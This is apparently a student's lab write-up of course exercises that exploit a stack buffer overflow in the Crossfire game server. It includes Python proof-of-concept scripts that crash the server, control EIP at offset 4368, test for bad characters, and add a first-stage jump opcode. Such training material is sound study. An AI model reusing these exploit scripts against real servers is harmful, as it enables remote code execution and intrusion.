# 12.2.1 - Replicating the Crash
#### Exercises

_(To be performed on your own Kali and Debian lab client machines - Reporting is required for these exercises)_

1.  Log in to your dedicated Linux client using the credentials you received.
In order to login to our linux client we simply need to start the machine and then rdesktop with our credentials.
`rdesktop -u student -g 1024x768 -r clipboard:CLIPBOARD 192.168.233.44`

In preperation for the remaining tasks we must also launch the "Crossfire" application
![[crossfire_start.png]]

2.  On your Kali machine, recreate the proof-of-concept code that crashes the Crossfire server.
Once the application is running we can use the following code on our Kali machine to crash the application 
```python
#!/usr/bin/python3
import socket

ip = "192.168.233.44"
port = 13327

crash = "\x41" * 4379
buffer = "\x11(setup sound " + crash + "\x90\x00#"

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

try:
  s.connect((ip, port))
  print("Sending buffer...")
  s.send(bytes(buffer + "\r\n", "latin-1"))
  print("Done!")
except:
  print("Could not connect.")
```




3.  Attach the debugger to the Crossfire server, run the exploit against your Linux client, and confirm that the EIP register is overwritten by the malicious buffer.
We need to start edb, attach to crossfire, and put crossfire into "Run" mode.
![[edb_running.png]]
Once this is complete we can execute our PoC code on our Kali machine to observe the crash.

![[edb_crossfire_crash.png]]




# 12.3.1 Controlling EIP
#### Exercises

_(To be performed on your own Kali and Debian lab client machines - Reporting is required for these exercises)_

**1.  Determine the correct buffer offset required to overwrite the return address on the stack.**

First we must create a pattern via msfvenom, we do this with the following command:
`msf-pattern_create -l 4379 `

We then add the pattern to our PoC, replacing the initial string of A's.
![[Pasted image 20220714141259.png]]
We can then run the PoC, using EDB to determine what part of the pattern overwrote EIP.
![[Pasted image 20220714141628.png]]

We can see that the new value of EIP is 46367046 and we can now use msf-pattern_offset to find its location.
![[Pasted image 20220714141906.png]]


**2.  Update your stand-alone script to ensure your offset is correct.**

Using the information above, we can update our PoC to ensure the proper offset is being sent. We have now updated the "crash" variable to reflect the proper offset of 4368. The "eip" variable should overwrite the EIP with 4 "B" characters. The remaining space should be filled with "C" characters via the "offset" variable. The script should now look something like this:
```python
#!/usr/bin/python3
import socket

ip = "192.168.233.44"
port = 13327


crash = "\x41" * 4368
eip = "B" * 4
offset = "C" * (4379 - len(eip) - len(crash))
inputBuffer = crash + eip + offset


buffer = "\x11(setup sound " + inputBuffer + "\x90\x00#"


s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

try:
  s.connect((ip, port))
  print("Sending buffer...")
  s.send(bytes(buffer + "\r\n", "latin-1"))
  print("Done!")
except:
  print("Could not connect.")
```



# 12.5.1 Checking for Bad Characters
#### Exercises

_(To be performed on your own Kali and Debian lab client machines - Reporting is required for these exercises)_

1.  Determine the opcodes required to generate a first stage shellcode using msf-nasm_shell.


2.  Identify the bad characters that cannot be included in the payload and return address.

I began by placing setting the "badchars" variable to represent all possible bad characters. I then placed this into the initial crash variable which was previous filled with "A" characters. I subtracted the length of "badchars" in order to maintain the same length and maintain control of EIP

The full code for checking the characters is as follows:
```python
#!/usr/bin/python3
import socket

ip = "192.168.233.44"
port = 13327

badchars = ""
badchars += "\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10"
badchars += "\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20"
badchars += "\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30"
badchars += "\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40"
badchars += "\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50"
badchars += "\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60"
badchars += "\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70"
badchars += "\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80"
badchars += "\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90"
badchars += "\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0"
badchars += "\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0"
badchars += "\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0"
badchars += "\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0"
badchars += "\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0"
badchars += "\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0"
badchars += "\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff"



crash = "A" * (4368 - len(badchars))
eip = "B" * 4
first_stage = "\x83\xc0\x0c\xff\xe0\x90\x90"

inputBuffer = crash + badchars + eip + first_stage

buffer = "\x11(setup sound " + inputBuffer + "\x90\x00#"


s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

try:
  s.connect((ip, port))
  print("Sending buffer...")
  s.send(bytes(buffer + "\r\n", "latin-1"))
  print("Done!")
except:
  print("Could not connect.")
```

This unfortunately required a bit of trial and error as the lines containing bad characters would sometimes result in a failed crash. Through the process of elimination eventually the characters were identified.

`\x20` and `x00`

![[Pasted image 20220714171745.png]]